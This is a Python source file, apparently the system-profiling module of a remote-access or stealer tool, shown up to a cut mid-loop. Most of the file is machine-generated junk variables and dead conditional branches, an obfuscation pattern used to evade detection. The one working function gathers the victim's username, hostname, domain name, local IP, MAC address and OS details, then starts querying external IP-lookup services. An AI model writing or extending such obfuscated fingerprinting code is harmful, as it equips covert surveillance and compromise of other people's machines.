# -*- coding: utf-8 -*-
import ctypes
YRblaUTMxErlCcTvzLbDihjWirYwTHZSbjNeCCeXTCFGCFadSpMeaCWiKKvpsRRz = 'TpstQAoJSrvaYfwWIcZvoXkruJzqxaXzRHUzcuToDOrgXIkUtRgaykGRhJCLrwkP'
esdxrFhKOGdLSLIrBjeBVZYFNZvgqCnFcSxAWlbraPGMQhCYqMuIbZNkzuzMcfpu = 'GFJXukMrkmOIuiDYDAlZmwzMApZfYIAejvUnPjFVoUpGGveGfHWuweNhspIciZrt'
mIejhCPtJCQGvwQuDigfIlGBYktNzemxDfYTLjqONXFiiXSuOJvBbZOqbAArCWVF = 'CKcHfefAeefZklBZKRVnaDXtMjsblhKJzmCwbVvxwCNcaDiVFYcHjtGJZrLoSZVk'
KxfwfQajdTnvofLbiMRaNTBgkyWZjRUVVnKwVtjWFXyuqEzirypqBqlUxCESNsWh = 'pzsZZMaOmvcbuKljLWiZuyZolXRJuULVcWIdeymRCQkeIzQAhurRfLdOnvNFvXzL'
ONljvmdJMGQtZAMDYtAUvZEvOYZMEjGkEYhjyRjGnDObqgWNEgVtbHdLrjDUofXH = 'vYNCfUfInExRScOxYQcUlzcvIrvvaTnvGGgzDEfizOLhbuUIhFQuYflKRUSDZyiM'
if YRblaUTMxErlCcTvzLbDihjWirYwTHZSbjNeCCeXTCFGCFadSpMeaCWiKKvpsRRz in esdxrFhKOGdLSLIrBjeBVZYFNZvgqCnFcSxAWlbraPGMQhCYqMuIbZNkzuzMcfpu:
    YRblaUTMxErlCcTvzLbDihjWirYwTHZSbjNeCCeXTCFGCFadSpMeaCWiKKvpsRRz = ONljvmdJMGQtZAMDYtAUvZEvOYZMEjGkEYhjyRjGnDObqgWNEgVtbHdLrjDUofXH
    if esdxrFhKOGdLSLIrBjeBVZYFNZvgqCnFcSxAWlbraPGMQhCYqMuIbZNkzuzMcfpu in mIejhCPtJCQGvwQuDigfIlGBYktNzemxDfYTLjqONXFiiXSuOJvBbZOqbAArCWVF:
        esdxrFhKOGdLSLIrBjeBVZYFNZvgqCnFcSxAWlbraPGMQhCYqMuIbZNkzuzMcfpu = KxfwfQajdTnvofLbiMRaNTBgkyWZjRUVVnKwVtjWFXyuqEzirypqBqlUxCESNsWh
elif esdxrFhKOGdLSLIrBjeBVZYFNZvgqCnFcSxAWlbraPGMQhCYqMuIbZNkzuzMcfpu in YRblaUTMxErlCcTvzLbDihjWirYwTHZSbjNeCCeXTCFGCFadSpMeaCWiKKvpsRRz:
    mIejhCPtJCQGvwQuDigfIlGBYktNzemxDfYTLjqONXFiiXSuOJvBbZOqbAArCWVF = esdxrFhKOGdLSLIrBjeBVZYFNZvgqCnFcSxAWlbraPGMQhCYqMuIbZNkzuzMcfpu
    if mIejhCPtJCQGvwQuDigfIlGBYktNzemxDfYTLjqONXFiiXSuOJvBbZOqbAArCWVF in esdxrFhKOGdLSLIrBjeBVZYFNZvgqCnFcSxAWlbraPGMQhCYqMuIbZNkzuzMcfpu:
        esdxrFhKOGdLSLIrBjeBVZYFNZvgqCnFcSxAWlbraPGMQhCYqMuIbZNkzuzMcfpu = ONljvmdJMGQtZAMDYtAUvZEvOYZMEjGkEYhjyRjGnDObqgWNEgVtbHdLrjDUofXH
import getpass
JnEpQkQpLnfOdFDKotMMyqRyhuFwKGMbZrfuzkBESfLUhLWYQtnJNslaepOAKnkG = 'mEdfDOpVTKwMIBslSHXBHYRrwVryxRdsdiOMKpuDGQWtHzsOpbNsLxZXKzkuwCtK'
FJArbotYdfpIwyhfoYyZLjYImxUnlXdYayQmgTewaQvOODEUGDqqHRjYhClgrRDX = 'TZODiGwKAgAxnfdPZtMUHpaQdUgUXwbEjdUZZBmVJHtuUVIqoghLOtburMaCFAsv'
WCQmZDvqpIrufCTSwoTdNyJpnQunxJkXTyddnHaFjxHMLYHpExpQfEWiqfRCqROX = 'QziYDJncXlYoiGAWVStfepQaVeOdVvZHLFqqqaCaKcGMSANeGFPoBjmJEksYJIXS'
RbmUfhcnuhYdEIMtMOOAaPxTCzqLUTQqKWUCiOpqQvoHDasvgZPAUjKXwDxVOiXs = 'yrOJvLONnxEEZLdQQIBOrUyLWhMGNZHJWViiYRkRTZciZQIMuXHDsvfSmrnQSPSh'
aZAOJyQNjpfuahCLEBlbPpJvTbpmfQekGvjyFiKAlVtjZLMYLSNHrkYnJBFhsASw = 'ClBJdBlJDkIItLRSlVdjFhWJzfCSfIIaosntedewLIOMWlYnqCiTaLGwanLSFezK'
XLAEfsZiDvLhHFNnJyVWFueHqZcadWUEBKfXLYJtjlxmGeJWeRtuRzYTJCscaMso = 'CKwpDPCLQGJSxFiJYZbKqlHwrmNLBchhVwRvuPtvapjeihMHhCvKbnfikHJzCOek'
if JnEpQkQpLnfOdFDKotMMyqRyhuFwKGMbZrfuzkBESfLUhLWYQtnJNslaepOAKnkG != RbmUfhcnuhYdEIMtMOOAaPxTCzqLUTQqKWUCiOpqQvoHDasvgZPAUjKXwDxVOiXs:
    FJArbotYdfpIwyhfoYyZLjYImxUnlXdYayQmgTewaQvOODEUGDqqHRjYhClgrRDX = WCQmZDvqpIrufCTSwoTdNyJpnQunxJkXTyddnHaFjxHMLYHpExpQfEWiqfRCqROX
    for XLAEfsZiDvLhHFNnJyVWFueHqZcadWUEBKfXLYJtjlxmGeJWeRtuRzYTJCscaMso in RbmUfhcnuhYdEIMtMOOAaPxTCzqLUTQqKWUCiOpqQvoHDasvgZPAUjKXwDxVOiXs:
        if XLAEfsZiDvLhHFNnJyVWFueHqZcadWUEBKfXLYJtjlxmGeJWeRtuRzYTJCscaMso != WCQmZDvqpIrufCTSwoTdNyJpnQunxJkXTyddnHaFjxHMLYHpExpQfEWiqfRCqROX:
            FJArbotYdfpIwyhfoYyZLjYImxUnlXdYayQmgTewaQvOODEUGDqqHRjYhClgrRDX = FJArbotYdfpIwyhfoYyZLjYImxUnlXdYayQmgTewaQvOODEUGDqqHRjYhClgrRDX
        else:
            aZAOJyQNjpfuahCLEBlbPpJvTbpmfQekGvjyFiKAlVtjZLMYLSNHrkYnJBFhsASw = JnEpQkQpLnfOdFDKotMMyqRyhuFwKGMbZrfuzkBESfLUhLWYQtnJNslaepOAKnkG
else:
    WCQmZDvqpIrufCTSwoTdNyJpnQunxJkXTyddnHaFjxHMLYHpExpQfEWiqfRCqROX = JnEpQkQpLnfOdFDKotMMyqRyhuFwKGMbZrfuzkBESfLUhLWYQtnJNslaepOAKnkG
    JnEpQkQpLnfOdFDKotMMyqRyhuFwKGMbZrfuzkBESfLUhLWYQtnJNslaepOAKnkG = aZAOJyQNjpfuahCLEBlbPpJvTbpmfQekGvjyFiKAlVtjZLMYLSNHrkYnJBFhsASw
    if WCQmZDvqpIrufCTSwoTdNyJpnQunxJkXTyddnHaFjxHMLYHpExpQfEWiqfRCqROX == JnEpQkQpLnfOdFDKotMMyqRyhuFwKGMbZrfuzkBESfLUhLWYQtnJNslaepOAKnkG:
        for XLAEfsZiDvLhHFNnJyVWFueHqZcadWUEBKfXLYJtjlxmGeJWeRtuRzYTJCscaMso in JnEpQkQpLnfOdFDKotMMyqRyhuFwKGMbZrfuzkBESfLUhLWYQtnJNslaepOAKnkG:
            if XLAEfsZiDvLhHFNnJyVWFueHqZcadWUEBKfXLYJtjlxmGeJWeRtuRzYTJCscaMso == WCQmZDvqpIrufCTSwoTdNyJpnQunxJkXTyddnHaFjxHMLYHpExpQfEWiqfRCqROX:
                WCQmZDvqpIrufCTSwoTdNyJpnQunxJkXTyddnHaFjxHMLYHpExpQfEWiqfRCqROX = JnEpQkQpLnfOdFDKotMMyqRyhuFwKGMbZrfuzkBESfLUhLWYQtnJNslaepOAKnkG
            else:
                WCQmZDvqpIrufCTSwoTdNyJpnQunxJkXTyddnHaFjxHMLYHpExpQfEWiqfRCqROX = aZAOJyQNjpfuahCLEBlbPpJvTbpmfQekGvjyFiKAlVtjZLMYLSNHrkYnJBFhsASw
import os
lBzGOAJbsHgGRBrnIjVZYvWNKHpbNNHKwNzqZLWDXlvtGsCVrzDSUJHmvnAkyrht = 'olQsjaqCYECVMnZDkAhyXdiTThgvOvazMHqOfuaqXuxBgvkElPaVcIqvihRDJlqZ'
iUnArTDiTVWKLvHjMMKCizuaSpxsIARQzGCvawRscNwsWTsXrgUMCLIFrvpElaaW = 'mdUNXVOCObbKUTaBrRpDryZdCZDahYRFwBqyAuyRrxcdteiXcEyscsWpANkAQvih'
HEyNEMWXPYbAXDpiiDEOvcqRBjOXUYrHQUEvPpVhdXBuRTrlwybYTOazPgFSuNTW = 'vxlhojsdWznWrhkNlzXdAiDWGHQCCtXyBIzQHufakiXQPFDZGXHmLUvJBaouYMnS'
wbvNaZbuIbhmUcTvAQSBipweCOjTcpzYtSqUmkLHuwbWFzZSDQiIpfrXuKPEgYOz = 'euKpzjjPBcabyTVfrTEyQmYrusEdCWcBCDRRcTbmhaUnLoCRNtEKjDtwIvvDZPqf'
cwKqVSNcmzJpJzDOnERrqFVHnSfJWUkCMaYtAxyYoHtHRcFOjdzvzlREaVUyjLwx = 'iXAlrDaLYipvPRgStiTcsAMkJWVqevoWFxxAtsRNZDFKUqiGwAfMZYLshBFUEWUz'
pSKNOKihHMZBhgosDTDtwMpDwzHMllREgQJmVHoMszuXKuCQsiQpJZAqHEReewdN = 'FGzTLbtBENXnjUNBUafJHROkpiOjAEWKQMzzFmktzJOvNzTvsJBxceRPLQfCCiBH'
if lBzGOAJbsHgGRBrnIjVZYvWNKHpbNNHKwNzqZLWDXlvtGsCVrzDSUJHmvnAkyrht != wbvNaZbuIbhmUcTvAQSBipweCOjTcpzYtSqUmkLHuwbWFzZSDQiIpfrXuKPEgYOz:
    iUnArTDiTVWKLvHjMMKCizuaSpxsIARQzGCvawRscNwsWTsXrgUMCLIFrvpElaaW = HEyNEMWXPYbAXDpiiDEOvcqRBjOXUYrHQUEvPpVhdXBuRTrlwybYTOazPgFSuNTW
    for pSKNOKihHMZBhgosDTDtwMpDwzHMllREgQJmVHoMszuXKuCQsiQpJZAqHEReewdN in wbvNaZbuIbhmUcTvAQSBipweCOjTcpzYtSqUmkLHuwbWFzZSDQiIpfrXuKPEgYOz:
        if pSKNOKihHMZBhgosDTDtwMpDwzHMllREgQJmVHoMszuXKuCQsiQpJZAqHEReewdN != HEyNEMWXPYbAXDpiiDEOvcqRBjOXUYrHQUEvPpVhdXBuRTrlwybYTOazPgFSuNTW:
            iUnArTDiTVWKLvHjMMKCizuaSpxsIARQzGCvawRscNwsWTsXrgUMCLIFrvpElaaW = iUnArTDiTVWKLvHjMMKCizuaSpxsIARQzGCvawRscNwsWTsXrgUMCLIFrvpElaaW
        else:
            cwKqVSNcmzJpJzDOnERrqFVHnSfJWUkCMaYtAxyYoHtHRcFOjdzvzlREaVUyjLwx = lBzGOAJbsHgGRBrnIjVZYvWNKHpbNNHKwNzqZLWDXlvtGsCVrzDSUJHmvnAkyrht
else:
    HEyNEMWXPYbAXDpiiDEOvcqRBjOXUYrHQUEvPpVhdXBuRTrlwybYTOazPgFSuNTW = lBzGOAJbsHgGRBrnIjVZYvWNKHpbNNHKwNzqZLWDXlvtGsCVrzDSUJHmvnAkyrht
    lBzGOAJbsHgGRBrnIjVZYvWNKHpbNNHKwNzqZLWDXlvtGsCVrzDSUJHmvnAkyrht = cwKqVSNcmzJpJzDOnERrqFVHnSfJWUkCMaYtAxyYoHtHRcFOjdzvzlREaVUyjLwx
    if HEyNEMWXPYbAXDpiiDEOvcqRBjOXUYrHQUEvPpVhdXBuRTrlwybYTOazPgFSuNTW == lBzGOAJbsHgGRBrnIjVZYvWNKHpbNNHKwNzqZLWDXlvtGsCVrzDSUJHmvnAkyrht:
        for pSKNOKihHMZBhgosDTDtwMpDwzHMllREgQJmVHoMszuXKuCQsiQpJZAqHEReewdN in lBzGOAJbsHgGRBrnIjVZYvWNKHpbNNHKwNzqZLWDXlvtGsCVrzDSUJHmvnAkyrht:
            if pSKNOKihHMZBhgosDTDtwMpDwzHMllREgQJmVHoMszuXKuCQsiQpJZAqHEReewdN == HEyNEMWXPYbAXDpiiDEOvcqRBjOXUYrHQUEvPpVhdXBuRTrlwybYTOazPgFSuNTW:
                HEyNEMWXPYbAXDpiiDEOvcqRBjOXUYrHQUEvPpVhdXBuRTrlwybYTOazPgFSuNTW = lBzGOAJbsHgGRBrnIjVZYvWNKHpbNNHKwNzqZLWDXlvtGsCVrzDSUJHmvnAkyrht
            else:
                HEyNEMWXPYbAXDpiiDEOvcqRBjOXUYrHQUEvPpVhdXBuRTrlwybYTOazPgFSuNTW = cwKqVSNcmzJpJzDOnERrqFVHnSfJWUkCMaYtAxyYoHtHRcFOjdzvzlREaVUyjLwx
import platform
whzgRtOxMnrePaarRxhXjpWxVcmiaNDEjevCYybDyObbNIqDHVXCDNSLEpSXBsQu = 'lgxdmueeXzAagsOvwIUvWYBfGqBlyoFVVfRcmbFHzwAKLEnrpWyAgKzXiBVonqER'
kaBRBKtAZOsavQNtebypmQHiGRuTDYpABwlglTjOCLPGHVVzztlFTqPucBhGJNnl = 'LNaDEMVkpLYfPjVxgKboSxQBCFmUCDFlUdCYPFyBTZgvuVztOXiAcWuSFhFdBphO'
pIdEDnMmRMtifVTflyslbRSdwLucJnRLWezkTtJxeQLYDWrzmNTIIQCeBYzdXfNF = 'JDsXDhtHrtryNoxFWIcQwaEFPRRTbRBRUqnrcAlYXjIXIvnXrGzaeDtCxwCcYSxu'
kmlNJirsUMCAwmnsuaxHzgpyolxFJaHHNsZWWzekthHVtBinLaLPQRnhrAELGIfM = 'vnEqIwxHrkNzcPndvUujLPdPxnJNqZTTQStDtPGqvaVEXAKnEoloXdbkzfzDrQYn'
AlNGLYHDwXGbmyxCFyLWftsAiRERKLwtAUZxLFZKtillIPbwGazGpnMYMjaeokoQ = 'PXEGYsYyLgFFdkwvbiWemtVDaKtKpjxwOhiNegUjjNVVYeLIgdQKYBpKqCMaZImd'
if whzgRtOxMnrePaarRxhXjpWxVcmiaNDEjevCYybDyObbNIqDHVXCDNSLEpSXBsQu in kaBRBKtAZOsavQNtebypmQHiGRuTDYpABwlglTjOCLPGHVVzztlFTqPucBhGJNnl:
    whzgRtOxMnrePaarRxhXjpWxVcmiaNDEjevCYybDyObbNIqDHVXCDNSLEpSXBsQu = AlNGLYHDwXGbmyxCFyLWftsAiRERKLwtAUZxLFZKtillIPbwGazGpnMYMjaeokoQ
    if kaBRBKtAZOsavQNtebypmQHiGRuTDYpABwlglTjOCLPGHVVzztlFTqPucBhGJNnl in pIdEDnMmRMtifVTflyslbRSdwLucJnRLWezkTtJxeQLYDWrzmNTIIQCeBYzdXfNF:
        kaBRBKtAZOsavQNtebypmQHiGRuTDYpABwlglTjOCLPGHVVzztlFTqPucBhGJNnl = kmlNJirsUMCAwmnsuaxHzgpyolxFJaHHNsZWWzekthHVtBinLaLPQRnhrAELGIfM
elif kaBRBKtAZOsavQNtebypmQHiGRuTDYpABwlglTjOCLPGHVVzztlFTqPucBhGJNnl in whzgRtOxMnrePaarRxhXjpWxVcmiaNDEjevCYybDyObbNIqDHVXCDNSLEpSXBsQu:
    pIdEDnMmRMtifVTflyslbRSdwLucJnRLWezkTtJxeQLYDWrzmNTIIQCeBYzdXfNF = kaBRBKtAZOsavQNtebypmQHiGRuTDYpABwlglTjOCLPGHVVzztlFTqPucBhGJNnl
    if pIdEDnMmRMtifVTflyslbRSdwLucJnRLWezkTtJxeQLYDWrzmNTIIQCeBYzdXfNF in kaBRBKtAZOsavQNtebypmQHiGRuTDYpABwlglTjOCLPGHVVzztlFTqPucBhGJNnl:
        kaBRBKtAZOsavQNtebypmQHiGRuTDYpABwlglTjOCLPGHVVzztlFTqPucBhGJNnl = AlNGLYHDwXGbmyxCFyLWftsAiRERKLwtAUZxLFZKtillIPbwGazGpnMYMjaeokoQ
import socket
pPHQjksqchvylybYvBldFKexOwJPPPbRRxnLjDAzpdqdLNnfQmSongXozLZtfnEa = 'pbQnlDcrlJpmrzsemKPjvkCqJgpBAtrVPIZXRrjnKZhWHxYVSPzSyzSdnNtyTBYy'
cYUnAwjOBnBzsMYnOjFBzaPZmSdVvThlGVGnbPuESQZuVQjLadEssNkxiqtxybXP = 'WuvTYkkbCPUpCKLsvWBkLLMajlQsmRtEmjnuNhEHsKNqCkuTKrylATXVAykfBBgE'
gdhheHfYcVKlDYZsOeRewIPNpmlrWqfMmCRPzKxCSPHjDwMckxkyzIgnXOFtIekV = 'VtLlRRBKdzpIZhXHwHSJMcooRZuYpJscseySyzTuyJdTzyFWlVoUUPobuEVpYEbn'
BpcnlvuoaKtyDWkZjDttvobsYEOWfjgFYzbbwxmcXjgiSzTLpeRwAVcoFalHJYkx = 'zipndDKyzWKMSRUEwMPBRSYbYOBgderSYaupqecgRBdvuRCwSbrGGZmwsprguRwJ'
QbKblDqZrRyLHDAGRXGuLSrRbRwryUaifYwkZtDjgJvmrImxmdCljTUuDyoaaqmu = 'CLFOebhjuveUKipNMiaTfCrnfEIWnZtVqkXWYwCvnkkUBGVEsDHldMvDLFmPovpi'
TaXGxyYsdoDLSXAruDNQyaBveuroQYERdgwTHoKunLApTjVfUurrxDNTvFYTeooa = 'bezwQppfVwQZRhZoZoXEYJnRsvucBwGodUmowYCTszxpAnQRszSdUSFnzRRzgBhX'
if gdhheHfYcVKlDYZsOeRewIPNpmlrWqfMmCRPzKxCSPHjDwMckxkyzIgnXOFtIekV == BpcnlvuoaKtyDWkZjDttvobsYEOWfjgFYzbbwxmcXjgiSzTLpeRwAVcoFalHJYkx:
    for TaXGxyYsdoDLSXAruDNQyaBveuroQYERdgwTHoKunLApTjVfUurrxDNTvFYTeooa in QbKblDqZrRyLHDAGRXGuLSrRbRwryUaifYwkZtDjgJvmrImxmdCljTUuDyoaaqmu:
        if TaXGxyYsdoDLSXAruDNQyaBveuroQYERdgwTHoKunLApTjVfUurrxDNTvFYTeooa == BpcnlvuoaKtyDWkZjDttvobsYEOWfjgFYzbbwxmcXjgiSzTLpeRwAVcoFalHJYkx:
            QbKblDqZrRyLHDAGRXGuLSrRbRwryUaifYwkZtDjgJvmrImxmdCljTUuDyoaaqmu = pPHQjksqchvylybYvBldFKexOwJPPPbRRxnLjDAzpdqdLNnfQmSongXozLZtfnEa
        else:
            BpcnlvuoaKtyDWkZjDttvobsYEOWfjgFYzbbwxmcXjgiSzTLpeRwAVcoFalHJYkx = cYUnAwjOBnBzsMYnOjFBzaPZmSdVvThlGVGnbPuESQZuVQjLadEssNkxiqtxybXP
import urllib
bHZpJDkFjdbXwTUbYmhQMbVqDbljKwdzlgdtezYQwxXPOnAnOvxstBXsHWHxejub = 'IURbvOfbEObPPEANlmdcuNfFjGgftlcFYnhBUmwVOAjlYHzAQUtaslzCfUDPERSj'
AlNamAEvUxcvOsGXfdtuZevWdNBMBWHumzDSZLOpCphCjGEhhMdDkuGUOAtaVHcL = 'PmOyTgOpQCLFWyRyaFKHYgbkgPyPtOyiXTvPknYFiLFrhpctfgBuXIDwtxkQInoJ'
AcIzupvLfTrbuRRIqpaNeySqNPHQAqpDencHHcAnAshSrmqjUgtHnWrSRBLnviDy = 'qSpeeZtjzhmELnGdHoNEdaitWfixKWlaGEGghQiKVoyZxjXRLDHZfbOdxnjUSaCn'
ocfPNtVXySynIghmSRHrQeFiwWghaMoxTHSoTBnjDXXrFcOjWryAgAhVFwFPUFrD = 'DZsOcSOPaAdSXOgpDaUIBhXNpNaEleJMuxddnfTQwWyxMhirNBRCykoYfsokfVIp'
MdrTJSnRtxVdPczmeqSGEWneWRxjRpqeMEkPtQcWSqFHBabonAqfuWXbBDoYUfJB = 'pxPrVQNvKXCyOvkSrmqhtgSbBsiCsLQJZoruMIDeMVpoWueGJxHZVDazpTonlwkU'
PaMuEpKuVkMFVTUhcNZHQKylfsgKUTEIMNKGWKeFaFuvgWbdJuohYjWQausJSvQh = 'hqXCUvknbWmtENwaPyQUdLzHDKQyJBOTtVbJqFnkpiFgrCvtHEgNtQHlAQQqsZmN'
if AcIzupvLfTrbuRRIqpaNeySqNPHQAqpDencHHcAnAshSrmqjUgtHnWrSRBLnviDy == ocfPNtVXySynIghmSRHrQeFiwWghaMoxTHSoTBnjDXXrFcOjWryAgAhVFwFPUFrD:
    for PaMuEpKuVkMFVTUhcNZHQKylfsgKUTEIMNKGWKeFaFuvgWbdJuohYjWQausJSvQh in MdrTJSnRtxVdPczmeqSGEWneWRxjRpqeMEkPtQcWSqFHBabonAqfuWXbBDoYUfJB:
        if PaMuEpKuVkMFVTUhcNZHQKylfsgKUTEIMNKGWKeFaFuvgWbdJuohYjWQausJSvQh == ocfPNtVXySynIghmSRHrQeFiwWghaMoxTHSoTBnjDXXrFcOjWryAgAhVFwFPUFrD:
            MdrTJSnRtxVdPczmeqSGEWneWRxjRpqeMEkPtQcWSqFHBabonAqfuWXbBDoYUfJB = bHZpJDkFjdbXwTUbYmhQMbVqDbljKwdzlgdtezYQwxXPOnAnOvxstBXsHWHxejub
        else:
            ocfPNtVXySynIghmSRHrQeFiwWghaMoxTHSoTBnjDXXrFcOjWryAgAhVFwFPUFrD = AlNamAEvUxcvOsGXfdtuZevWdNBMBWHumzDSZLOpCphCjGEhhMdDkuGUOAtaVHcL
import uuid
GNxEYwtsjrJvLRSXtJVmtQPbRjRnHBSoiVMYidHgzJvsOVwvYGcUMUfdJEuwCYPA = 'drDwgnHfOEllldHWEBTEZSzfMZSRIDQIiwJgaEteFwLBBLsUXqBMApNzzQSyoqbG'
GlddfmhUfDcUmTxXYnFuVasxCdZyRRepFIMEsqqFYlKDwfMTMAAywbVqsBcXSwqt = 'SDgEynqjohVMHohYYQFfpbiXdjzsugUZwXgpjVeBvpSPRmkusrylsxBmlsFyQWiC'
qXzaLZFmtDoRNdRaqJiijPCGcgFzeWXRlrjMrZrmIzephwAoZhewObtyZcBZCHDw = 'DQgdBsLMGSGMaJOHFCLbLpsDfBUpwPIGNGtuOMXXiAyKVUhcslCLizywgZYElacW'
AalppILtyNoRVjuvYQcNncAIGkYSZpFDxNFXPpcVFHFksFhIRQdDSPtNzwzZdILK = 'BcnGkptFzvQZqkGYZUVIvETgwFqsVvZUIqtZqdXTHkzRQgsLMbVSmssAcwpBfDeI'
FYgHACSuvbivvgBuQoZFYjiTIRGVTAVbWzvmFYSITtySUIOtbTocvmJEnMkloOXG = 'wAZFWhqAKPlBkAKbNJSVpmOTicZDCSrfLJZctpkEWLDAYVwjkWQVvaSBLbcRrdWi'
HdsliheCfrGfemJmdaUtEdCDGlDPuiQpOErvEUMefWpHclqDsuIygGMPVgQhvSqX = 'czeyhnhRoRGNQzaIgLXUQTaMfZYeuomIUSsmvENAwLSMFtujLfYRJCVkHGhfffit'
if GNxEYwtsjrJvLRSXtJVmtQPbRjRnHBSoiVMYidHgzJvsOVwvYGcUMUfdJEuwCYPA != AalppILtyNoRVjuvYQcNncAIGkYSZpFDxNFXPpcVFHFksFhIRQdDSPtNzwzZdILK:
    GlddfmhUfDcUmTxXYnFuVasxCdZyRRepFIMEsqqFYlKDwfMTMAAywbVqsBcXSwqt = qXzaLZFmtDoRNdRaqJiijPCGcgFzeWXRlrjMrZrmIzephwAoZhewObtyZcBZCHDw
    for HdsliheCfrGfemJmdaUtEdCDGlDPuiQpOErvEUMefWpHclqDsuIygGMPVgQhvSqX in AalppILtyNoRVjuvYQcNncAIGkYSZpFDxNFXPpcVFHFksFhIRQdDSPtNzwzZdILK:
        if HdsliheCfrGfemJmdaUtEdCDGlDPuiQpOErvEUMefWpHclqDsuIygGMPVgQhvSqX != qXzaLZFmtDoRNdRaqJiijPCGcgFzeWXRlrjMrZrmIzephwAoZhewObtyZcBZCHDw:
            GlddfmhUfDcUmTxXYnFuVasxCdZyRRepFIMEsqqFYlKDwfMTMAAywbVqsBcXSwqt = GlddfmhUfDcUmTxXYnFuVasxCdZyRRepFIMEsqqFYlKDwfMTMAAywbVqsBcXSwqt
        else:
            FYgHACSuvbivvgBuQoZFYjiTIRGVTAVbWzvmFYSITtySUIOtbTocvmJEnMkloOXG = GNxEYwtsjrJvLRSXtJVmtQPbRjRnHBSoiVMYidHgzJvsOVwvYGcUMUfdJEuwCYPA
else:
    qXzaLZFmtDoRNdRaqJiijPCGcgFzeWXRlrjMrZrmIzephwAoZhewObtyZcBZCHDw = GNxEYwtsjrJvLRSXtJVmtQPbRjRnHBSoiVMYidHgzJvsOVwvYGcUMUfdJEuwCYPA
    GNxEYwtsjrJvLRSXtJVmtQPbRjRnHBSoiVMYidHgzJvsOVwvYGcUMUfdJEuwCYPA = FYgHACSuvbivvgBuQoZFYjiTIRGVTAVbWzvmFYSITtySUIOtbTocvmJEnMkloOXG
    if qXzaLZFmtDoRNdRaqJiijPCGcgFzeWXRlrjMrZrmIzephwAoZhewObtyZcBZCHDw == GNxEYwtsjrJvLRSXtJVmtQPbRjRnHBSoiVMYidHgzJvsOVwvYGcUMUfdJEuwCYPA:
        for HdsliheCfrGfemJmdaUtEdCDGlDPuiQpOErvEUMefWpHclqDsuIygGMPVgQhvSqX in GNxEYwtsjrJvLRSXtJVmtQPbRjRnHBSoiVMYidHgzJvsOVwvYGcUMUfdJEuwCYPA:
            if HdsliheCfrGfemJmdaUtEdCDGlDPuiQpOErvEUMefWpHclqDsuIygGMPVgQhvSqX == qXzaLZFmtDoRNdRaqJiijPCGcgFzeWXRlrjMrZrmIzephwAoZhewObtyZcBZCHDw:
                qXzaLZFmtDoRNdRaqJiijPCGcgFzeWXRlrjMrZrmIzephwAoZhewObtyZcBZCHDw = GNxEYwtsjrJvLRSXtJVmtQPbRjRnHBSoiVMYidHgzJvsOVwvYGcUMUfdJEuwCYPA
            else:
                qXzaLZFmtDoRNdRaqJiijPCGcgFzeWXRlrjMrZrmIzephwAoZhewObtyZcBZCHDw = FYgHACSuvbivvgBuQoZFYjiTIRGVTAVbWzvmFYSITtySUIOtbTocvmJEnMkloOXG
def MLHlzBrlHlRHgwQrfyWjACciGuFXCTKNwPUFwdxLvtefBBDIaFXJNJlgiRrJVSjP(plat_type):
    EWmtWlkJuLgkUOjxEJxQMXtqfFncvpresgyHIVopFDsFtoWHRBeMRyhQODNyZgJx = platform.platform()
    processor    = platform.processor()
    architecture = platform.architecture()[0]
    aCCAQHXQAvQZWaKOxvkRXHIrsUPZsNLpuSrFaMNviuPDGVwBMwnqlzYturgbLdMB = getpass.getuser()
    yACdQyDMoosZjJvgEFQQTHOifCqXXGBvGsKPzqBHyfgENOvFsmcWVIjTAizZnXHu    = socket.gethostname()
    nnkKjbvrMoaYqGZoOfFvAZCXmChgIqUpQcTCiyeBecIgwncTOmJZxesxqfkRbhqO        = socket.getfqdn()
    RAyqNtzgupuaVxvixrlAZPbjGWbogkQmKERIPQPQvgdHKnfPvtGTrqPTVdCDKprN = socket.gethostbyname(yACdQyDMoosZjJvgEFQQTHOifCqXXGBvGsKPzqBHyfgENOvFsmcWVIjTAizZnXHu)
    WgbZBbjIgRgnHYsIktxsVVdIZOVatFoVTbSTlTfhkTJBQdjDfzjPwQcCDPbMpZyO     = uuid.getnode()
    GDHIYkOsmvTwojcNGWOCApAzWuSZjAHOpPHdYyKDuWDnoxqbhNzniAtFvFNEOzue         = ':'.join(("%012X" % WgbZBbjIgRgnHYsIktxsVVdIZOVatFoVTbSTlTfhkTJBQdjDfzjPwQcCDPbMpZyO)[gbmTWTdiXtIeWXKoczPyVtTTHymECNedwWptAPimDnEzzjjFpUNKjNAubLPtdKqv:gbmTWTdiXtIeWXKoczPyVtTTHymECNedwWptAPimDnEzzjjFpUNKjNAubLPtdKqv+2] for gbmTWTdiXtIeWXKoczPyVtTTHymECNedwWptAPimDnEzzjjFpUNKjNAubLPtdKqv in range(0, 12, 2))
    gWAWyxghWeARWiQQeGHinQLKnHglbmpfhXAdNvQlgrrXlIUGYeYLvRUmNJgcDyKI = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw' ]
    tBKdonglGAbHXFWbrxqcxkahYESDsuSGWrvqzDZDbLqSqvVGdWRUcnGewVhfHros = ''
    for WJdoQXqxSEsaPLIVoWyJpEdnEKGToGFMLANrRgBzbkUzwfTZXxERXXykcDmJEinQ in gWAWyxghWeARWiQQeGHinQLKnHglbmpfhXAdNvQlgrrXlIUGYeYLvRUmNJgcDyKI:
        jlxLCIDmXBbcCOscFNtwuTfwjzicMqjqgRLOctVEeRipqIgYXNzQFxLngCPgdVmB = 'KzWLiNfJPfIrZNctNmlgYSRpmzyvvSkHnRvypOIfyOKLnVGieTyiGqtshaLdwVFF'
        NoPNBrxmtysMNItPTQZTXkPfCECBwAdbNdZFUndKWyjRcmccKFnMvxcLYONXxClv = 'gZFqmYwqPmpGgKgXVLSCtnZUSKpsWAexdsJpoAOWrqKZduuOPgqJFEqWaWeKljze'
        NMyvxWvzYWgPNHJpNiftOFtMEvZgZjsvLFICIheEVHnalSSxYxfqgMlhofKCvKPp = 'IRECGViJKtngQgtqWAOceIkVSVwUcLUtTxGTcFMuHPAYajMyEtwUGFucvfrCEvIl'
        NeMtMXxZbwhOJxWyKZGXISKpIKcyMAhqSQkcbGapghUmTNKnCabOtJobUwcnErKc = 'BwuYfGtSwvVsoBoJRPFkxluYyYLTOonFchXkjdytKuPIMwtaMcsvKxFdTrczHUFQ'
        XhNZbETtqOisYloAhIlNIeUnSToeMEvHspziArDkrGrJAVNxPoeWWVDSoEGVXJmR = 'gzSfUJSfgaiNWWOHdWHZxJhUbvhiaCMGMNtzHvRuhSkVDySHUyZHpzNJSWTFJaiu'
